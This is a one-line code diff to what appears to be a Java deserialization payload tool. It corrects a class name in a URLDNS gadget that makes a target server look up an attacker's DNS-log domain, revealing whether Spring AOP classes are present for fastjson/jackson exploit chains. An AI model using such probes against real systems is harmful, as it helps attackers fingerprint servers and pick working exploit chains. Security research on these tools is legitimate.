@@ -231,7 +231,7 @@ public class URLDNS implements ObjectPayload<Object> {
                 break;
             case "SpringAOP":
                 //fastjon/jackson两个链触发toString的变种,都需要springAOP
-                Object springAOP = getURLDNSGadget("SpringAOP." + dnsLog, "org.springframework.aop.target.HotSwappableTargetSource.HotSwappableTargetSource");
+                Object springAOP = getURLDNSGadget("SpringAOP." + dnsLog, "org.springframework.aop.target.HotSwappableTargetSource");
                 list.add(springAOP);
                 break;
             case "winlinux":
